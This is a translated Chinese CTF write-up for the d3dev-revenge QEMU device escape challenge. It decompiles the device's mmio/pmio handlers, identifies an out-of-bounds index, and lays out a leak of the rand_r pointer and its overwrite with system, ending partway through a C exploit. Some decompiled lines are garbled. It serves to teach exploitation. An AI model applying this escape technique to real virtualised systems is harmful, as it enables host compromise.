# 2021 AntCTF x D3CTF 部分PWN WriteUp
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## d3dev-revenge
###  分析
首先看一下启动脚本
    #!/bin/sh
    ./qemu-system-x86_64 \
    -L pc-bios/ \
    -m 128M \
    -kernel vmlinuz \
    -initrd rootfs.img \
    -smp 1 \
    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet" \
    -device d3dev \
    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
    -nographic \
    -monitor /dev/null
我们看到这里的`device`的名称是`d3dev`，`ida`看一下相关的函数，发现存在`mmio/pmio`两种方式，分别分析一下，首先看一下`pmio_read`
    uint64_t __fastcall d3dev_pmio_read(void *opaque, hwaddr addr, unsigned int size)
    {
      uint64_t result; // rax
      if ( addr > 0x18 )
        result = -1LL;
      else
        result = ((__int64 (__fastcall *)(void *))((char *)dword_7ADF30 + dword_7ADF30[addr]))(opaque);
      return result;
    }
这里看发生了一个未知的调用，采用的应该是函数表的形式，不过这里不重要，接下来看一下`pmio_write`
    void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr cmd, uint64_t val, unsigned int size)
    {
      uint32_t *v4; // rbp
      if ( cmd == 8 )
      {
        if ( val seek = val;                       // 设定seek
      }
      else if ( cmd > 8 )
      {
        if ( cmd == 0x1C )                          // 随机生成key
        {
          opaque->r_seed = val;
          v4 = opaque->key;
          do
            *v4++ = ((__int64 (__fastcall *)(uint32_t *, __int64, uint64_t, _QWORD))opaque->rand_r)(
                      &opaque->r_seed,
                      0x1CLL,
                      val,
                      *(_QWORD *)&size);
          while ( v4 != (uint32_t *)&opaque->rand_r );
        }
      }
      else if ( cmd )
      {
        if ( cmd == 4 )                             // 清空两个key
        {
          *(_QWORD *)opaque->key = 0LL;
          *(_QWORD *)&opaque->key[2] = 0LL;
        }
      }
      else
      {
        opaque->memory_mode = val;
      }
    }
这里涉及到了`d3devState`数据结构，看一下
    00000000 d3devState      struc ; (sizeof=0x1300, align=0x10, copyof_4545)
    00000000 pdev            PCIDevice_0 ?
    000008E0 mmio            MemoryRegion_0 ?
    000009D0 pmio            MemoryRegion_0 ?
    00000AC0 memory_mode     dd ?
    00000AC4 seek            dd ?
    00000AC8 init_flag       dd ?
    00000ACC mmio_read_part  dd ?
    00000AD0 mmio_write_part dd ?
    00000AD4 r_seed          dd ?
    00000AD8 blocks          dq 257 dup(?)
    000012E0 key             dd 4 dup(?)
    000012F0 rand_r          dq ?                    ; offset
    000012F8                 db ? ; undefined
    000012F9                 db ? ; undefined
    000012FA                 db ? ; undefined
    000012FB                 db ? ; undefined
    000012FC                 db ? ; undefined
    000012FD                 db ? ; undefined
    000012FE                 db ? ; undefined
    000012FF                 db ? ; undefined
    00001300 d3devState      ends
这里是根据`cmd`的值来达到不同的功能
  * `cmd=8`，设定`seek`的值，这里的`seekblocks[opaque->seek + (unsigned int)(addr >> 3)];
      sum = 0xC6EF3720;
      v1 = v;
      v0 = HIDWORD(v);
      do
      {
        LODWORD(v0) = v0 - ((v1 + sum) ^ (opaque->key[3] + (v1 >> 5)) ^ (opaque->key[2] + 16 * v1));
        v1 -= (v0 + sum) ^ (opaque->key[1] + ((unsigned int)v0 >> 5)) ^ (opaque->key[0] + 16 * v0);
        sum += 0x61C88647;
      }
      while ( sum );
      if ( opaque->mmio_read_part )
      {
        opaque->mmio_read_part = 0;
        v0 = (unsigned int)v0;
      }
      else
      {
        opaque->mmio_read_part = 1;
        v0 = v1;
      }
      return v0;
    }
这里是根据输入的`addr>>3`作为`offset`读取`blocks`中的相关内容，读取的内容进行了加密处理，很容易可以看出来这里的加密算法是`tea`的解密算法。`tea`的加解密算法可以参考[这里](https://www.jianshu.com/p/4272e0805da3)
需要注意的这里需要读取两次才能够获得完整的加密`8`字节数据。接下来看一下`mmio_write`
    void __fastcall d3dev_mmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)
    {
      __int64 offset; // rsi
      ObjectClass_0 **opaque_address; // r11
      uint64_t v6; // rdx
      int v7; // esi
      uint32_t key0; // er10
      uint32_t key1; // er9
      uint32_t key2; // er8
      uint32_t key3; // edi
      unsigned int v12; // ecx
      uint64_t result; // rax
      if ( size == 4 )
      {
        offset = opaque->seek + (unsigned int)(addr >> 3);
        if ( opaque->mmio_write_part )
        {
          opaque_address = &opaque->pdev.qdev.parent_obj.class + offset;
          v6 = val mmio_write_part = 0;
          key0 = opaque->key[0];
          key1 = opaque->key[1];
          key2 = opaque->key[2];
          key3 = opaque->key[3];
          v12 = v6 + *((_DWORD *)opaque_address + 0x2B6);
          result = ((unsigned __int64)opaque_address[0x15B] + v6) >> 32;
          do
          {
            v7 -= 0x61C88647;
            v12 += (v7 + result) ^ (key1 + ((unsigned int)result >> 5)) ^ (key0 + 16 * result);
            LODWORD(result) = ((v7 + v12) ^ (key3 + (v12 >> 5)) ^ (key2 + 16 * v12)) + result;
          }
          while ( v7 != 0xC6EF3720 );
          opaque_address[0x15B] = (ObjectClass_0 *)__PAIR64__(result, v12);
        }
        else
        {
          opaque->mmio_write_part = 1;
          opaque->blocks[offset] = (unsigned int)val;
        }
      }
    }
这里与`mmio_read`类似，虽然这里的`ida`反汇编显示有点问题，但是根据调试可以知道这里的功能就是将用户输入的数据进行解密。解密算法就是`tea`的加密算法（反向理解也可以，写入加密，读取解密）将解密后的数据写入到`blocks[seek+offset]`中。这里也提供了直接写入的
分支，不过只能写入四子节。
###  利用
这里可以很明显的发现一个索引越界漏洞，即`seek`最大为`0x100`，但是对用户输入的`offset`没有进行限制，而`blocks`的大小为`0x101`，也就是这里可以直接越界对`d3devState`结构体进行读写。
很容易的我们发现可以读取器中的`rand_r`函数指针泄漏出`libc`的基址，进而得到`system`的地址，然后可以将`rand_r`函数指针覆写为`system`，之后在进行`pmio_write`中调用`rand_r`函数指针即可执行命令。
###  EXP
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    unsigned char* mmio_mem;
    uint32_t mmio_addr = 0xfebf1000;
    uint32_t mmio_size = 0x800;
    int32_t pmio_base = 0xc040;
    void die(const char* msg)
    {
        perror(msg);
        exit(-1);
    }
    void* mem_map( const char* dev, size_t offset, size_t size )
    {
        int fd = open( dev, O_RDWR | O_SYNC );
        if ( fd == -1 ) {
            return 0;
        }
        void* result = mmap( NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset );
        if ( !result ) {
            return 0;
        }
        close( fd );
        return result;
    }
    void mmio_write(uint64_t addr, uint64_t value, int choice)
    {
        if (choice == 0){
            *((uint8_t*)(mmio_mem + addr)) = value;
        }
        else if (choice == 1){
            *((uint16_t*)(mmio_mem + addr)) = value;
        }
        else if (choice == 2){
            *((uint32_t*)(mmio_mem + addr)) = value;
        }
        else if (choice == 3){
            *((uint64_t*)(mmio_mem + addr)) = value;
        }
    }
    uint64_t mmio_read(uint32_t addr, int choice)
    {
        if(choice == 0){
            return *((uint8_t*)(mmio_mem + addr));
        }
        else if(choice == 1){
            return *((uint16_t*)(mmio_mem + addr));
        }
        else if(choice == 2){
            return *((uint32_t*)(mmio_mem + addr));
        }
        else if(choice == 3){
            return *((uint64_t*)(mmio_mem + addr));
        }
    }
    void pmio_write(uint32_t addr, uint32_t value)
    {